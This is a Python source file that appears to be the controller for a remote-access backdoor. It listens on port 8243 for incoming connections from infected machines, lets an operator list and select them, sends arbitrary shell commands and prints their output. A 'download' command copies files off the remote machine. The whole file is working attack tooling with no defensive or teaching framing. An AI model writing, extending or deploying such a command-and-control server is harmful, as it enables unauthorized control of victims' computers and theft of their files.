import socket
import os
import threading
from pathlib import Path


HOST = "0.0.0.0"
PORT = 8243

active_clients = []


def handle_socket():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()

        while True:
                conn, addr = s.accept()
                client = Client(conn, addr)
                active_clients.append(client)
                print(f"{addr} awailable")


def handle_UI():
    
    while True:
        try:
            data = input("")
            commands = data.split(" ")

            if commands[0] == "list":
                for i in range(len(active_clients)):
                    print(f"{i} - {active_clients[i].addr}\n")

            elif commands[0] == "connect":
                if len(commands) == 2:
                    id = int(commands[1])
                    if id < len(active_clients) :
                        client = active_clients[id]
                        client.handle()
                        
                    else:
                        print("not a valid client id\n")
                else:
                    print("connect requires 1 argument\n")

            else:
                print("command not found\n")

        except Exception as e:
            print(e)



class Client():
    def __init__(self, conn, addr) -> None:
        self.conn = conn
        self.addr = addr
        self.HEADER = 64
        self.active = False


    def close(self):
        self.conn.close()
        self.active = False
        active_clients.remove(self)

    
    def receive(self):
        try:
            msg_length = self.conn.recv(self.HEADER)
            if msg_length:
                msg_length = int(msg_length)

                data = b""
                chunk = self.conn.recv(2048)
                while True:
                    data += chunk
                    if len(data) < msg_length:
                        chunk = self.conn.recv(2048)
                    else:
                        break

                return data.decode()
            
            else:
                self.close()
                      
        except ConnectionResetError as e :
            self.close()
            return str(e)

        except ConnectionAbortedError as e:
            self.close()
            return str(e)


    def execute_command(self, command):
        try:
            if command.split(" ")[0] == "disconnect":
                self.active = False
                return "Disconnected"

            elif command.split(" ")[0] == "download":
                self.conn.send(command.encode())
                filename =  Path(command[len("download "):]).name
                
                if not os.path.exists("./downloads"): 
                    os.makedirs("./downloads")

                exists = int(self.conn.recv(1).decode())

                if exists:
                    with open(Path("downloads") / filename, "wb") as f:
                        data = self.conn.recv(1024)
                        while data:
                            if data == b"FINISHED" + b" " * (1024 - len(b"FINISHED")):
                                break
                            f.write(data)
                            data = self.conn.recv(1024)

            else:
                self.conn.send(command.encode())
                
            data = self.receive()
            if data == "destroy":
                self.close()
                return f"Terminating connection {self.addr}"
        
            return data

        except Exception as e:
            self.close()
            print(e)
            return "Client is offline"

    
    def handle(self):
        self.active = True
        while self.active:
            prompt = self.receive() + " ~ "
            command = input(prompt)
            print(self.execute_command(command)+ "\n")

        
if __name__ == "__main__":
    input_thread = threading.Thread(target=handle_UI)
    input_thread.start()
    handle_socket()